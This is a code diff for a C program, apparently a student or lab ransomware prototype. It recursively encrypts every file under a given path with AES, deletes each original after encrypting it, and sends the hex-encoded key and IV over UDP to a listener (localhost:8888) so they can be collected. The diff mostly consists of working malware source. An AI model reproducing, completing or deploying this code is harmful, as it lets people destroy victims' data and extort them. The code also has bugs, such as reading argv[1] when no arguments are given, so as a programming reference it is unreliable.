@@ -99,16 +99,46 @@ int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key, u
     return plaintext_len;
 }
 
+char *byteTOhex(const unsigned char *bytes, const unsigned short int size){
+    char *buffer_str = (char *) malloc(((size * 2) + 1) * sizeof(char));
+
+    if (buffer_str == NULL) return NULL;
+
+    for (unsigned int i = 0; i < size; i++){
+        sprintf(&buffer_str[i * 2], "%02X", bytes[i]);
+    }
+
+
+    return buffer_str;
+}
+
+void socket_msg(unsigned char key[32], unsigned char iv[16]){
+    char *server_ip = "127.0.0.1";
+    int server_port = 8888;
+
+    int sockid = socket(AF_INET, SOCK_DGRAM, 0);
+
+    struct sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(server_port);
+    server_addr.sin_addr.s_addr = inet_addr(server_ip);
+
+    char *msg_key, *msg_iv, *return_line = "\n";
+
+    msg_key = byteTOhex(key, 32);
+    msg_iv = byteTOhex(iv, 16);
+
+    sendto(sockid, (const char *)msg_key, strlen(msg_key), 0, (const struct sockaddr *) &server_addr, sizeof (server_addr));
+    sendto(sockid, (const char *)return_line, strlen(return_line), 0, (const struct sockaddr *) &server_addr, sizeof (server_addr));
+    sendto(sockid, (const char *)msg_iv, strlen(msg_iv), 0, (const struct sockaddr *) &server_addr, sizeof (server_addr));
+
+    close(sockid);
+}
+
 #define KEY_SIZE 32
 #define IV_SIZE 16
 
-void crypted_list_dir(const char *path) {
-    unsigned char key[KEY_SIZE];
-    unsigned char iv[IV_SIZE];
-
-    RAND_bytes(key, KEY_SIZE); //randomize the key
-    RAND_bytes(iv, IV_SIZE); //randomize the iv
-
+void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
     DIR *directory;
     struct dirent *entry;
     FILE *file_start, *file_crypted, *file_decrypted;
@@ -129,11 +159,11 @@ void crypted_list_dir(const char *path) {
             if (buffer_directory != NULL) {
                 snprintf(buffer_directory, lenght, "%s/%s", path, file); //stock filepath in the buffer
 
-                crypted_list_dir(buffer_directory);
+                crypted_list_dir(buffer_directory, key, iv);
 
                 free(buffer_directory);
             }
-        } else if (strcmp(file, ".") != 0 && strcmp(file, "..") != 0) {
+        } else if (strcmp(file, ".") != 0 && strcmp(file, "..")) {
             printf("Path file : %s/%s\n", path, file);
 
             unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;
@@ -144,7 +174,6 @@ void crypted_list_dir(const char *path) {
 
             if (buffer_start == NULL) { //check if the memory is allocated
                 printf("Can't allocate the memory !\n");
-                /*continue; //break the execution of the code but continue the while loop*/
             } else if (buffer_start != NULL){
                 snprintf(buffer_start, lenght, "%s/%s", path, file); //stock filepath
 
@@ -179,7 +208,7 @@ void crypted_list_dir(const char *path) {
                         int file_crypted_len = encrypt(text_in_file, read_file_len_start, key, iv, crypted_text_in_file);
                         fwrite(crypted_text_in_file, sizeof(unsigned char), file_crypted_len, file_crypted);
                         printf("Crypted ! -> %s\n", buffer_crypted);
-
+                        remove(buffer_start);
                     }
 
                     fclose(file_crypted);
@@ -191,7 +220,6 @@ void crypted_list_dir(const char *path) {
                         fwrite(decrypted_text_in_file, sizeof(unsigned char), file_decrypted_len, file_decrypted);
 
                         printf("Decrypted ! -> %s\n", buffer_decrypted);
-
                     }
                 }
 
@@ -204,20 +232,42 @@ void crypted_list_dir(const char *path) {
 
     closedir(directory); //close directory
 
+    socket_msg(key,iv);
+
 }
-
-
 
 int main(int argc, char *argv[]) {
 
+    unsigned char *key = (unsigned char *) malloc(KEY_SIZE);
+    unsigned char *iv = (unsigned char*) malloc(IV_SIZE);
+
+    RAND_bytes(key, KEY_SIZE); //randomize the key
+    RAND_bytes(iv, IV_SIZE); //randomize the iv
+
     printf("%d arguments \n", argc - 1);
 
-    for (int i = 1; i < 2; i++) {
-        printf("Path : %s\n", argv[i]);
+    if (argc == 1){
+        printf("Manuel d'utilisation : \n"
+               "Pour afficher le répertoire : -listdir <PATH>\n"
+               "Pour chiffrer le répertoire : -crypt <PATH>\n"
+               "Pour déchiffrer le répertoire : -decrypt <PATH>\n");
+    }
 
-        if (strlen(argv[i]) <= PATH_MAX) {
-            crypted_list_dir(argv[i]);
+    if (strcmp(argv[1], "-listdir") == 0){
+
+    } else if (strcmp(argv[1], "-decrypt") == 0){
+
+    } else if (strcmp(argv[1], "-crypt") == 0) {
+        printf("Path : %s\n", argv[2]);
+
+        if (strlen(argv[2]) <= PATH_MAX != 0) {
+            crypted_list_dir(argv[2], key, iv);
         }
     }
+
+    memset(key, 0, KEY_SIZE);
+    memset(iv, 0, IV_SIZE);
+    free(key);
+    free(iv);
     return (0);
 }
